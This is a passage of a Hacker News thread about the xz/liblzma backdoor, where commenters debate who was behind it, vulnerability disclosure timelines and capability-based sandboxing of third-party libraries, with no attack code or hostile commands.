unlikely that various Chinese IoT companies would just decide it's cool to add a backdoor, which clearly implies that no matter how good their intentions are, they simply might have no other choice. | | --- | --- | --- | | | |  |  | [gpm](user?id=gpm) [9 months ago](item?id=39866574)   | [root](#39866275) | [parent](#39866472) | [next](#39866939) [–]  There are roughly speaking two possibilities here: 1. His machine was compromised, he wasn't at fault past having less than ideal security (a sin we are all guilty of). His country or origin/residence is of no importance and doxing him isn't fair to him. 2. This account was malicious. There's no reason we should believe that the identity behind wasn't fabricated. The country of origin/residence is likely falsified. In neither case is trying to investigate who he is on a public forum likely to be productive. In both cases there's risk of aiming an internet mob at some innocent person who was 'set up'. | | --- | --- | --- | | | |  |  | [rjzzleep](user?id=rjzzleep) [9 months ago](item?id=39867114)   | [root](#39866275) | [parent](#39866574) | [next](#39866765) [–]  The back door is in the upstream GitHub tarball. The most obvious way to get stuff there is by compromising an old style GitHub token. The new style GitHub tokens are much better but it’s somewhat intransparent what options you need. Most people also don’t use expiring tokens. The authors seems to have a lot of oss contributions, so probably an easy target to choose. | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39866765)   | [root](#39866275) | [parent](#39866574) | [prev](#39867114) | [next](#39916031) [–]  Why do you exclude the possibility that this person was forced to add this at gunpoint? | | --- | --- | --- | | | |  |  | [encoderer](user?id=encoderer) [9 months ago](item?id=39866863)   | [root](#39866275) | [parent](#39866765) | [next](#39916031) [–]  Yes exactly this. How do people think state actors have all those 0 day exploits. Excellent research? No! They are adding them themselves! | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916031)   | [root](#39866275) | [parent](#39866574) | [prev](#39866765) | [next](#39866939) [–]  I think the letters+numbers naming scheme for both the main account and the sockpuppets used to get him access to xz and the versions into distros is a strong hint at (2). Taking over xz maintainership without any history of open source contributions is also suspicious. | | --- | --- | --- | | | |  |  | [noncoml](user?id=noncoml) [9 months ago](item?id=39866939)   | [root](#39866275) | [parent](#39866472) | [prev](#39866574) | [next](#39866999) [–]  Because it’s naive to think that the owner of the account used his real identity. | | --- | --- | --- | | | |  |  | [zb3](user?id=zb3) [9 months ago](item?id=39866971)   | [root](#39866275) | [parent](#39866939) | [next](#39866999) [–]  But my point is that people living in China might be "forced" to do such things, so we unfortunately can't ignore the country. Of course, practically this is problematic since the country can be faked | | --- | --- | --- | | | |  |  | [sorokod](user?id=sorokod) [9 months ago](item?id=39866999)   | [parent](#39866275) | [prev](#39866433) | [next](#39868153) [3 more]  [flagged] | | --- | --- | --- | | | |  |  | [matheusmoreira](user?id=matheusmoreira) [9 months ago](item?id=39867064)   | [root](#39866275) | [parent](#39866999) | [next](#39868153) [–]  Don't blame the guy. Could have happened to anyone. Even you. | | --- | --- | --- | | | |  |  | [sorokod](user?id=sorokod) [9 months ago](item?id=39867988)   | [root](#39866275) | [parent](#39867064) | [next](#39868153) [2 more]  [flagged] | | --- | --- | --- | | | |  |  | [dang](user?id=dang) [9 months ago](item?id=39869987)   | [root](#39866275) | [parent](#39867988) | [next](#39868153) [–]  It's uncharitable and comes across as a personal attack, which is not allowed in HN comments. | | --- | --- | --- | | | |  |  | [Jommi](user?id=Jommi) [9 months ago](item?id=39868153)   | [parent](#39866275) | [prev](#39866999) | [next](#39866551) [–]  the account was either sold or stolen | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916064)   | [root](#39866275) | [parent](#39868153) | [next](#39866551) [–]  That's pure speculation and there are plenty of hints to the contrary. | | --- | --- | --- | | | |  |  | [move-on-by](user?id=move-on-by) [9 months ago](item?id=39866551)   | [prev](#39866275) | [next](#39867258) [–]  Fascinating. Just yesterday the author added a `SECURITY.md` file to the `xz-java` project. > If you discover a security vulnerability in this project please report it privately. \*Do not disclose it as a public issue.\* This gives us time to work with you to fix the issue before public exposure, reducing the chance that the exploit will be used before a patch is released. Reading that in a different light, it says give me time to adjust my exploits and capitalize on any targets. Makes me wonder what other vulns might exist in the author's other projects. | | --- | --- | --- | | | |  |  | [ncr100](user?id=ncr100) [9 months ago](item?id=39867960)   | [parent](#39866551) | [next](#39867666) [–]  *Security Researchers*: Is this request-for-private-disclosure + "90-days before public" reasonable? It's a SEVERE issue, to my mind, and 90 days seems too long to me. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39868806)   | [root](#39866551) | [parent](#39867960) | [next](#39868502) [–]  In this particular case, there is a strong reason to expect exploitation in the wild to already be occurring (because it's an intentional backdoor) and this would change the risk calculus around disclosure timelines. But in the general case, it's normal for 90 days to be given for the coordinated patching of even very severe vulnerabilities -- you are giving time not just to the project maintainers, but to the users of the software to finish updating their systems to a new fixed release, before enough detail to easily weaponize the vulnerability is shared. Google Project Zero is an example of a team with many critical impact findings using a 90-day timeline. | | --- | --- | --- | | | |  |  | [ang\_cire](user?id=ang_cire) [9 months ago](item?id=39869163)   | [root](#39866551) | [parent](#39868806) | [next](#39873535) [–]  As someone in security who doesn't work at a major place that get invited to the nice pre-notification notifications, I hate this practice. My customers and business are not any less important or valuable than anyone else's, and I should not be left being potentially exploited, and my customers harmed, for 90 more days while the big guys get to patch their systems (thinking of e.g. Log4J, where Amazon, Meta, Google, and others were told privately how to fix their systems, before others were even though the fix was simple). Likewise, as a customer I should get to know as soon as someone's software is found vulnerable, so I can then make the choice whether to continue to subject myself to the risk of continuing to use it until it gets patched. | | --- | --- | --- | | | |  |  | [hatter](user?id=hatter) [9 months ago](item?id=39870293)   | [root](#39866551) | [parent](#39869163) | [next](#39869873) [–]  > My ... business are not any less ... valuable than anyone else's, Plainly untrue. The reason they keep distribution minimal is to maximise the chance of keeping the vuln secret. Your business is plainly less valuable than google, than walmart, than godaddy, than BoA. Maybe you're some big cheese with a big reputation to keep, but seeing as you're feeling excluded, I guess these orgs have no more reason to trust you than they have to trust me, or hundreds of thousands of others who want to know. If they let you in, they'd let all the others in, and odds are greatly increased that now your customers are at risk from something one of these others has worked out, and either blabbed about or has themselves a reason to exploit it. Similarly plainly, by disclosing to 100 major companies, they protect a vast breadth of consumers/customer-businesses of these major companies at a risk of 10,000,000/100 (or even less, given they may have more valuable reputation to keep). Changing that risk to 12,000,000/10,000 is, well, a risk they don't feel is worth taking. | | --- | --- | --- | | | |  |  | [squeaky-clean](user?id=squeaky-clean) [9 months ago](item?id=39872565)   | [root](#39866551) | [parent](#39870293) | [next](#39876149) [–]  > Your business is plainly less valuable than google, than walmart, than godaddy, than BoA. The company I work for has a market cap roughly 5x that of goDaddy and we're responsible for network connected security systems that potentially control whether a person can physically access your home, school, or business. We were never notified of this until this HN thread. If your BofA account gets hacked you lose money. If your GoDaddy account gets hacked you lose your domain. If Walmart gets hacked they lose... What money and have logistics issues for a while? Thankfully my company's products have additional safeguards and this isn't a breach for us. But what if it was? Our customers can literally lose their lives if someone cracks the security and finds a way to remotely open all the locks in their home or business. Don't tell me that some search engine profits or someone's emails history is "more valuable" than 2000 schoolchildren's lives. How about you give copies of the keys to your apartment and a card containing your address to 50 random people on the streets and see if you still feel that having your Gmail account hacked is more valuable. | | --- | --- | --- | | | |  |  | [jpc0](user?id=jpc0) [9 months ago](item?id=39877085)   | [root](#39866551) | [parent](#39872565) | [next](#39873956) [–]  I think from an exposure point of view, I'm less likely to worry about the software side of my physical security being exploited that the actual hardware side. None of the points you make are relevant since I have yet to see any software based entry product whose software security can be concidered more than lackluster at best, maybe your company is better since you didn't mention a name I can't say otherwise. What I'm saying is your customers are more likely to have their doors physically broken than remotely opened by software and you are here on about life and death because of a vuln in xz? If your companies market cap is as high as you say and they are as security aware as you say why aren't they employing security researchers and actively on the forefront of finding vulns and reporting them? That would get them an invite to the party. | | --- | --- | --- | | | |  |  | [SonOfLilit](user?id=SonOfLilit) [9 months ago](item?id=39873956)   | [root](#39866551) | [parent](#39872565) | [prev](#39877085) | [next](#39916130) [–]  Sorry, but that's not a serious risk analysis. The average person would be hurt a *lot* more by a godaddy breach by a state actor than by a breach of your service by a state actor. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916130)   | [root](#39866551) | [parent](#39872565) | [prev](#39873956) | [next](#39876149) [–]  Man if it was ever appropriate to tell someone to touch grass this would be it. The think of the children part is a nice touch as well. 10/10 copypasta would repost. | | --- | --- | --- | | | |  |  | [maerF0x0](user?id=maerF0x0) [9 months ago](item?id=39876149)   | [root](#39866551) | [parent](#39870293) | [prev](#39872565) | [next](#39869873) [–]  > Your business is plainly less valuable than google, than walmart, than godaddy, than BoA. Keep in mind it's the EROI not market cap. A company is worth attacking if their reward:effort ratio is right. Smaller companies have a much lower effort required. | | --- | --- | --- | | | |  |  | [freedomben](user?id=freedomben) [9 months ago](item?id=39869873)   | [root](#39866551) | [parent](#39869163) | [prev](#39870293) | [next](#39869191) [–]  Being in a similar boat, I heartily agree. But I don't want anyone else to get notified immediately because the odds that somebody will start exploiting people before a patch is available is pretty high. Since I can't have both, I will choose the 90 days for the project to get patches done and all the packagers to include them and make them available, so that by the time it's public knowledge I'm already patched. I think this is a Tragedy of the Commons type of problem. Caveat: This assume the vuln is found by a white hat. If it's being exploited already or is known to others, then I fully agree the disclosure time should be eliminated and it's BS for the big companies to get more time than us. | | --- | --- | --- | | | |  |  | [cjbprime](user?id=cjbprime) [9 months ago](item?id=39869191)   | [root](#39866551) | [parent](#39869163) | [prev](#39869873) | [next](#39869896) [–]  OpenSSL's "notification of an upcoming critical release" is public, not private. You do get to know that the vulnerability exists quickly, and you could choose to stop using OpenSSL altogether (among other mitigations) once that email goes out. | | --- | --- | --- | | | |  |  | [sidewndr46](user?id=sidewndr46) [9 months ago](item?id=39871001)   | [root](#39866551) | [parent](#39869191) | [next](#39869896) [–]  if your system has already been compromised at the root level, it does not matter in the least bit | | --- | --- | --- | | | |  |  | [Thorrez](user?id=Thorrez) [9 months ago](item?id=39871872)   | [root](#39866551) | [parent](#39871001) | [next](#39869896) [–]  Well if you assume everyone has already been exploited, disclosing quickly vs slowly won't prevent that. Also, if something is being actively exploited, usually there's no or very little embargo. | | --- | --- | --- | | | |  |  | [oceanplexian](user?id=oceanplexian) [9 months ago](item?id=39869896)   | [root](#39866551) | [parent](#39869163) | [prev](#39869191) | [next](#39869234) [–]  Yeah I worked in FAANG when we got the advance notice of a number of CVEs. Personally I think it's shady, I don't care how big Amazon or Google is, they shouldn't get special privileges because they are a large corporation. | | --- | --- | --- | | | |  |  | [kelnos](user?id=kelnos) [9 months ago](item?id=39872203)   | [root](#39866551) | [parent](#39869896) | [next](#39869234) [–]  I don't think the rationale is that they are a large corporation or have lots of money. It's that they have many, many, many more users that would be affected than most companies have. | | --- | --- | --- | | | |  |  | [sdenton4](user?id=sdenton4) [9 months ago](item?id=39874236)   | [root](#39866551) | [parent](#39872203) | [next](#39869234) [–]  I imagine they also have significant resources to contribute to dealing with breaches - eg, analysing past cookouts by the bad actor, designing mitigations, etc. | | --- | --- | --- | | | |  |  | [wyldberry](user?id=wyldberry) [9 months ago](item?id=39869234)   | [root](#39866551) | [parent](#39869163) | [prev](#39869896) | [next](#39872310) [–]  I empathize with this as I've been in the same boat, but all entities are not equal when performing triage. | | --- | --- | --- | | | |  |  | [voidfunc](user?id=voidfunc) [9 months ago](item?id=39872310)   | [root](#39866551) | [parent](#39869163) | [prev](#39869234) | [next](#39871058) [–]  > My customers and business are not any less important or valuable than anyone else's Hate to break it to you but yes they are. | | --- | --- | --- | | | |  |  | [umanwizard](user?id=umanwizard) [9 months ago](item?id=39871058)   | [root](#39866551) | [parent](#39869163) | [prev](#39872310) | [next](#39873535) [–]  > My customers and business are not any less important or valuable than anyone else's Of course they are. If Red Hat has a million times more customers than you do then they are collectively more valuable almost by definition. | | --- | --- | --- | | | |  |  | [InvertedRhodium](user?id=InvertedRhodium) [9 months ago](item?id=39871143)   | [root](#39866551) | [parent](#39871058) | [next](#39873535) [–]  If OP is managing something that is critical to life - think fire suppression controllers, or computers that are connected to medical equipment, I think it becomes very difficult to compare that against financial assets. | | --- | --- | --- | | | |  |  | [ajdlinux](user?id=ajdlinux) [9 months ago](item?id=39872822)   | [root](#39866551) | [parent](#39871143) | [next](#39882543) [–]  At a certain scale, "economic" systems become critical to life. Someone who has sufficiently compromised a systemically-important bank can do things that would result in riots breaking out on the street all over a country. | | --- | --- | --- | | | |  |  | [concordDance](user?id=concordDance) [9 months ago](item?id=39882543)   | [root](#39866551) | [parent](#39871143) | [prev](#39872822) | [next](#39873255) [–]  You could use the EPA dollar to life conversion ratio. Though anything actually potentially lethal shouldn't really have a standard Internet connection. E.g. nuclear power plants, trains, planes controls, heavy industrial equipment, nuclear weapons... | | --- | --- | --- | | | |  |  | [codedokode](user?id=codedokode) [9 months ago](item?id=39873255)   | [root](#39866551) | [parent](#39871143) | [prev](#39882543) | [next](#39872071) [–]  Something that is critical to life should not be connected to Internet. | | --- | --- | --- | | | |  |  | [AlexandrB](user?id=AlexandrB) [9 months ago](item?id=39874640)   | [root](#39866551) | [parent](#39873255) | [next](#39872071) [–]  And yet it seems like every new car is. | | --- | --- | --- | | | |  |  | [richrichie](user?id=richrichie) [9 months ago](item?id=39875601)   | [root](#39866551) | [parent](#39874640) | [next](#39872071) [–]  Sshhh now you are starting to talk like a rightwinger. Alex Jones has been saying this for a long time ;) | | --- | --- | --- | | | |  |  | [jen20](user?id=jen20) [9 months ago](item?id=39872071)   | [root](#39866551) | [parent](#39871143) | [prev](#39873255) | [next](#39916179) [–]  Such systems should be airgapped… | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916179)   | [root](#39866551) | [parent](#39871143) | [prev](#39872071) | [next](#39872078) [–]  In that case OP should not design systems were a sshd compromise can have a life-threatening impact. Just because it's easier for everything to be controlled from the cloud doesn't mean that others need to feel sympathy when that turnes out to be as bad of an idea as everyone else has said. | | --- | --- | --- | | | |  |  | [solarengineer](user?id=solarengineer) [9 months ago](item?id=39872078)   | [root](#39866551) | [parent](#39871143) | [prev](#39916179) | [next](#39873535) [–]  I can think of two approaches for such companies: a. Use commercial OS vendors who will push out fixes. b. Set up a Continuous Integration process where everything is open source and is built from the ground up, with some reliance on open source platforms such as distros. One needs different types of competence and IT Operational readiness in each approach. | | --- | --- | --- | | | |  |  | [squeaky-clean](user?id=squeaky-clean) [9 months ago](item?id=39872608)   | [root](#39866551) | [parent](#39872078) | [next](#39873535) [–]  > b. Set up a Continuous Integration process where everything is open source and is built from the ground up, with some reliance on open source platforms such as distros. How would that have prevented this backdoor? | | --- | --- | --- | | | |  |  | [hulitu](user?id=hulitu) [9 months ago](item?id=39873535)   | [root](#39866551) | [parent](#39868806) | [prev](#39869163) | [next](#39868502) [–]  > but to the users of the software to finish updating their systems to a new fixed release, Is there "a new fixed release" ? | | --- | --- | --- | | | |  |  | [bawolff](user?id=bawolff) [9 months ago](item?id=39868502)   | [root](#39866551) | [parent](#39867960) | [prev](#39868806) | [next](#39869106) [–]  Whether its reasonable is debatable, but that type of time frame is pretty normal for things that aren't being actively exploited. This situation is perhaps a little different as its not an accidental bug waiting to be discovered but an intentionally placed exploit. We know that a malicious person already knows about it. | | --- | --- | --- | | | |  |  | [larschdk](user?id=larschdk) [9 months ago](item?id=39869089)   | [root](#39866551) | [parent](#39868502) | [next](#39868991) [–]  Detecting a security issue is one thing. Detecting a malicious payload is something completely different. The latter has intent to exploit and must be addressed immediately. The former has at least some chance of noone knowing about it. | | --- | --- | --- | | | |  |  | [londons\_explore](user?id=londons_explore) [9 months ago](item?id=39868991)   | [root](#39866551) | [parent](#39868502) | [prev](#39869089) | [next](#39869106) [–]  If you were following Google Project Zero's policy (which many researchers do), any in-the-wild exploits would trigger an immediate reveal. | | --- | --- | --- | | | |  |  | [sterlind](user?id=sterlind) [9 months ago](item?id=39869106)   | [root](#39866551) | [parent](#39867960) | [prev](#39868502) | [next](#39869673) [–]  I think you have to take the credibility of the maintainer into account. If it's a large company, made of people with names and faces, with a lot to lose by hacking its users, they're unlikely to abuse private disclosure. If it's some tiny library, the maintainers might be in on it. Also, if there's evidence of exploitation in the wild, the embargo is a gift to the attacker. The existence of a vulnerability in that case should be announced, even if the specifics have to be kept under embargo. | | --- | --- | --- | | | |  |  | [fmajid](user?id=fmajid) [9 months ago](item?id=39869335)   | [root](#39866551) | [parent](#39869106) | [next](#39869673) [–]  In this case the maintainer is the one who deliberately introduced the backdoor. As Andres Freund puts it deadpan, "Given the apparent upstream involvement I have not reported an upstream bug." | | --- | --- | --- | | | |  |  | [decoy78](user?id=decoy78) [9 months ago](item?id=39869673)   | [root](#39866551) | [parent](#39867960) | [prev](#39869106) | [next](#39872407) [–]  imho it depends on the vuln. I've given a vendor over a year, because it was a very low risk vuln. This isn't a vuln though - this is an attack. | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916270)   | [root](#39866551) | [parent](#39869673) | [next](#39872407) [–]  > imho it depends on the vuln. I've given a vendor over a year, because it was a very low risk vuln. But why? A year is a ridiculous time for fixing a vulnerability even a minor one. If a vendor is taking that long its because they don't prioritize security at all and are just dragging their feet. | | --- | --- | --- | | | |  |  | [BartjeD](user?id=BartjeD) [9 months ago](item?id=39872407)   | [root](#39866551) | [parent](#39867960) | [prev](#39869673) | [next](#39870996) [–]  The fraudulent author must have enjoyed the 'in joke' -- He's the one create vulnerabilities.. | | --- | --- | --- | | | |  |  | [sidewndr46](user?id=sidewndr46) [9 months ago](item?id=39870996)   | [root](#39866551) | [parent](#39867960) | [prev](#39872407) | [next](#39867666) [–]  I've always laughed my ass off at the idea of a disclosure window. It takes less than a day to find RCE that grants root privileges on devices that I've bothered to look at. Why on earth would I bother spending months of my time trying to convince someone to fix something? | | --- | --- | --- | | | |  |  | [xyst](user?id=xyst) [9 months ago](item?id=39867666)   | [parent](#39866551) | [prev](#39867960) | [next](#39867938) [–]  90 day dark window for maintainers is SOP though. Then after 90 days, it’s free game for public disclosure | | --- | --- | --- | | | |  |  | [szundi](user?id=szundi) [9 months ago](item?id=39867938)   | [parent](#39866551) | [prev](#39867666) | [next](#39868152) [–]  How many of people like this one exist? | | --- | --- | --- | | | |  |  | [ldayley](user?id=ldayley) [9 months ago](item?id=39868499)   | [root](#39866551) | [parent](#39867938) | [next](#39874138) [–]  If this question had a reliable (and public) answer then the world would be a very different place! That said, this is an important question. We, particularly those us who work on critical infrastructure or software, should be asking ourselves this regularly to help prevent this type of thing. Note that it's also easy (and similarly catastrophic) to swing too far the other way and approach all unknowns with automatic paranoia. We live in a world where we have to trust strangers every day, and if we lose that option completely then our civilization grinds to a halt. But-- vigilance is warranted. I applaud these engineers who followed their instincts and dug into this. They all did us a huge service! EDIT: wording, spelling | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39869918)   | [root](#39866551) | [parent](#39868499) | [next](#39916321) [–]  Yeah thanks for saying this; I agree. And as cliche as it is to look for a technical solution to a social problem, I also think better tools could help a lot here. The current situation is ridiculous - if I pull in a compression library from npm, cargo or Python, why can that package interact with my network, make syscalls (as me) and read and write files on my computer? Leftpad shouldn’t be able to install crypto ransomware on my computer. To solve that, package managers should include capability based security. I want to say “use this package from cargo, but refuse to compile or link into my binary any function which makes any syscall except for *read* and *write*. No *open* - if I want to compress or decompress a file, I’ll open the file myself and pass it in.” No messing with my filesystem. No network access. No raw asm, no trusted build scripts and no exec. What I allow is all you get. The capability should be transitive. All dependencies of the package should be brought in under the same restriction. In dynamic languages like (server side) JavaScript, I think this would have to be handled at runtime. We could add a capability parameter to all functions which issue syscalls (or do anything else that’s security sensitive). When the program starts, it gets an “everything” capability. That capability can be cloned and reduced to just the capabilities needed. (Think, *pledge*). If I want to talk to redis using a 3rd party library, I pass the redis package a capability which only allows it to open network connections. And only to this specific host on this specific port. It wouldn’t stop all security problems. It might not even stop this one. But it would dramatically reduce the attack surface of badly behaving libraries. | | --- | --- | --- | | | |  |  | [Guvante](user?id=Guvante) [9 months ago](item?id=39870521)   | [root](#39866551) | [parent](#39869918) | [next](#39871791) [–]  Doesn't this exact exploit not fixed by your capability theory? It is hijacking a process that has network access at runtime not build time. The build hack grabs files from the repo and inspects build parameters (in a benign way, everyone checks whether you are running on X platform etc) | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39872439)   | [root](#39866551) | [parent](#39870521) | [next](#39871791) [–]  The problem we have right now is that any linked code can do anything, both at build time and at runtime. A good capability system should be able to stop xz from issuing network requests even if other parts of the process do interact with the network. It certainly shouldn't have permission to replace crc32\_resolve() and crc64\_resolve() via ifunc. Another way of thinking about the problem is that right now every line of code within a process runs with the same permissions. If we could restrict what 3rd party libraries can do - via checks either at build time or runtime - then supply chain attacks like this would be much harder to pull off. | | --- | --- | --- | | | |  |  | [im3w1l](user?id=im3w1l) [9 months ago](item?id=39872989)   | [root](#39866551) | [parent](#39872439) | [next](#39873386) [–]  I'm not convinced this is such a cure-all as any library must necessarily have the ability to "taint" its output. Like consider this library. It's a compression library. You would presumably trust it to decompress things right? Like programs? And then you run those programs with full permission? Oops.. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39873266)   | [root](#39866551) | [parent](#39872989) | [next](#39873386) [–]  It’s not a cure-all. I mean, we’re talking about infosec - so nothing is. But that said, barely any programs need the ability to execute arbitrary binaries. I can’t remember the last time I used eval() in JavaScript. I agree that it wouldn’t stop this library from injecting backdoors into decompressed executables. But I still think it would be a big help anyway. It would stop this attack from working. At the big picture, we need to acknowledge that we can’t implicitly trust opensource libraries on the internet. They are written by strangers, and if you wouldn’t invite them into your home you shouldn’t give them permission to execute arbitrary code with user level permissions on your computer. I don’t think there are any one size fits all answers here. And I can’t see a way to make your “tainted output” idea work. But even so, cutting down the trusted surface area from “leftpad can cryptolocker your computer” to “Leftpad could return bad output” sounds like it would move us in the right direction. | | --- | --- | --- | | | |  |  | [Guvante](user?id=Guvante) [9 months ago](item?id=39890589)   | [root](#39866551) | [parent](#39873266) | [next](#39873386) [–]  There are attacks that embed hacks into built compilers so unless you are looking to write your software from scratch you need to trust people. And by scratch I mean "without modern hardware" given supply chain attacks also apply to the hardware you build from. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39901795)   | [root](#39866551) | [parent](#39890589) | [next](#39873386) [–]  Of course we need to trust people to some degree. There's an old Jewish saying - put your trust in god, but your money in the bank. I think its like that. I'm all for trusting people - but I still like how my web browser sandboxes every website I visit. That is a good idea. We (obviously) put too much trust in little libraries like xz. I don't see a world in which people start using fewer dependencies in their projects. So given that, I think anything which makes 3rd party dependencies *safer* than they are now is a good thing. Hence the proposal. The downside is it adds more complexity. Is that complexity worth it? Hard to say. Thats still worth talking about. | | --- | --- | --- | | | |  |  | [ui2RjUen875bfFA](user?id=ui2RjUen875bfFA) [9 months ago](item?id=39903592)   | [root](#39866551) | [parent](#39901795) | [next](#39873386) [–]  i guess the big opensource community should put a little bit more trust in statistics or integrate statistic evaluation in their decission making to use specific products in their supply chains. there are some researches on the right track already <https://www.se.cs.uni-saarland.de/projects/congruence/> | | --- | --- | --- | | | |  |  | [fauigerzigerk](user?id=fauigerzigerk) [9 months ago](item?id=39873386)   | [root](#39866551) | [parent](#39872439) | [prev](#39872989) | [next](#39874826) [–]  This approach could work for dynamic libraries, but a lot of modern ecosystems (Go, Rust, Swift) prefer to distribute packages as source code that gets compiled with the including executable or library. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39874714)   | [root](#39866551) | [parent](#39873386) | [next](#39874826) [–]  Yes, and? The goal is to restrict what included libraries can do. As you say, in languages like Rust, Go or Swift, the mechanism to do this would also need to work with statically linked code to work. And thats quite tricky, because there are no isolation boundaries between functions in executables. It should still be possible to build something like this. It would just be inconvenient. In rust, swift and go you'd probably want to implement something like this at compile time. In rust, I'd start by banning unsafe in dependencies. (Or whitelisting which projects are allowed to use unsafe code.) Then add special annotations on all the methods in the standard library which need special permissions to run. For example, File::open, fork, exec, networking, and so on. In cargo.toml, add a way to specify which permissions your child libraries get. "Import serde, but give it no OS permissions". When you compile your program, the compiler can look at the call tree of each function to see what actually gets called, and make sure the permissions match up. If you call a function in serde which in turn calls File::open (directly or indirectly), and you didn't explicitly allow that, the program should fail to compile. It should be fine for serde to contain some utility function that calls the banned File::open, so long as the utility function isn't called. Permissions should be in a tree. As you get further out in the dependency tree, libraries get fewer permissions. If I pass permissions {X,Y} to serde, serde can pass permission {X} to one of its dependencies in turn. But serde can't pass permission {Q} to its dependency - since it doesn't have that capability itself. Any libraries which use unsafe are sort of trusted to do everything. You might need to insist that any package which calls unsafe code is actively whitelisted by the cargo.toml file in the project root. | | --- | --- | --- | | | |  |  | [fauigerzigerk](user?id=fauigerzigerk) [9 months ago](item?id=39882999)   | [root](#39866551) | [parent](#39874714) | [next](#39874826) [–]  *>It should still be possible to build something like this. It would just be inconvenient.* Inconvenient is quite the understatement. Designing and implementing something like this for each and every language compiler/runtime requires hugely more effort than doing it on the OS level. The likelihood of mistakes is also far greater. Perhaps it's worth exploring whether it can be done on the LLVM level so that at least some languages can share an implementation. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874826)   | [root](#39866551) | [parent](#39872439) | [prev](#39873386) | [next](#39871791) [–]  Do you understand how ifuncs work? They are in the address space in the application that they run in. liblzma is resolving *its own* pointers! | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39871791)   | [root](#39866551) | [parent](#39869918) | [prev](#39870521) | [next](#39916321) [–]  if I got it right, the attack uses glibc IFUNC mechanism to patch sshd (and only sshd) to directly run some code in liblzma when sshd verifies logins. so the problem is IFUNC mechanism, which has its valid uses but can be EASILY misused for any sort of attacks | | --- | --- | --- | | | |  |  | [AgentME](user?id=AgentME) [9 months ago](item?id=39874306)   | [root](#39866551) | [parent](#39871791) | [next](#39872402) [–]  A process can do little to defend itself from a library it's using which has full access to its same memory. There is no security boundary there. This kind of backdoor doesn't hinge on IFUNC's existence. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39872402)   | [root](#39866551) | [parent](#39871791) | [prev](#39874306) | [next](#39874833) [–]  Honestly, I don't have a lot of hope that we can fix this problem for C on linux. There's just *so much* historical cruft in present, spread between autotools, configure, make, glibc, gcc and C itself that would need to be modified to support capabilities. The rule we need is "If I pull in library X with some capability set, then X can't do anything not explicitly allowed by the passed set of capabilities". The problem in C is that there is currently no straightforward way to firewall off different parts of a linux process from each other. And dynamic linking on linux is done by gluing together compiled artifacts - with no way to check or understand what assembly instructions any of those parts contain. I see two ways to solve this generally: - Statically - ie at compile time, the compiler annotates every method with a set of permissions it (recursively) requires. The program fails to compile if a method is called which requires permissions that the caller does not pass it. In rust for example, I could imagine cargo enforcing this for rust programs. But I think it would require some changes to the C language itself if we want to add capabilities there. Maybe some compiler extensions would be enough - but probably not given a C program could obfuscate which functions call which other functions. - Dynamically. In this case, every linux system call is replaced with a new version which takes a capability object as a parameter. When the program starts, it is given a capability by the OS and it can then use that to make child capabilities passed to different libraries. I could imagine this working in python or javascript. But for this to work in C, we need to stop libraries from just scanning the process's memory and stealing capabilities from elsewhere in the program. | | --- | --- | --- | | | |  |  | [estebarb](user?id=estebarb) [9 months ago](item?id=39875415)   | [root](#39866551) | [parent](#39872402) | [next](#39874833) [–]  Or take the Chrome / original Go approach: load that code in a different process, use some kind of RPC. With all the context switch penalty... sigh, I think it is the only way, as the MMU permissions work at a page level. | | --- | --- | --- | | | |  |  | [josephg](user?id=josephg) [9 months ago](item?id=39877951)   | [root](#39866551) | [parent](#39875415) | [next](#39874833) [–]  Firefox also has its solution of compiling dependencies to wasm, then compiling the wasm back into C code and linking that. It’s super weird, but the effect is that each dependency ends up isolated in bounds checked memory. No context switch penalty, but instead the code runs significantly slower. | | --- | --- | --- | | | |  |  | [saagarjha](user?id=saagarjha) [9 months ago](item?id=39874833)   | [root](#39866551) | [parent](#39871791) | [prev](#39872402) | [next](#39916321) [–]  The problem is that the attacker has code execution in sshd, not ifuncs | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916321)   | [root](#39866551) | [parent](#39868499) | [prev](#39869918) | [next](#39870331) [–]  > We, particularly those us who work on critical infrastructure or software We should also be asking ourselves *if* we are working on critical infrastructure. Lasse Collin probably did not consider liblzma being loaded by sshd when vetting the new maintainer. Did the xz project ever agree to this responsibility? We should also be asking ourselfs if each dependency of critical infrastructure is worth the risk. sshd linking libsystemd just to write a few bytes into an open fd is absurd. libsystemd pulling in liblzma because hey it also does compressed logging is absurd. Yet this kind of absurd dependency bloat is everywhere. | | --- | --- | --- | | | |  |  | [saalweachter](user?id=saalweachter) [9 months ago](item?id=39870331)   | [root](#39866551) | [parent](#39868499) | [prev](#39916321) | [next](#39870363) [–]  Assume 3% of the population is malicious. Enough to be cautious, enough to think about how to catch bad actors, not so much as to close yourself off and become a paranoid hermit. | | --- | --- | --- | | | |  |  | [heresie-dabord](user?id=heresie-dabord) [9 months ago](item?id=39873942)   | [root](#39866551) | [parent](#39870331) | [next](#39871140) [–]  We live in a time of populous, *wealthy* dictatorships that have computer-science expertise are openly hostile to the US and Canada. North America is only about 5% of the world's population. [1] (We can assume that malicious actors are in North America, too, but this helps to adjust our perspective.) The percentage of maliciousness *on the Internet* is much higher. [1] \_ See continental subregions. [https://en.wikipedia.org/wiki/List\_of\_continents\_and\_contine...](https://en.wikipedia.org/wiki/List_of_continents_and_continental_subregions_by_population) | | --- | --- | --- | | | |  |  | [account42](user?id=account42) [9 months ago](item?id=39916488)   | [root](#39866551) | [parent](#39873942) | [next](#39875683) [–]  The US government itself is openly hostile to the US (as 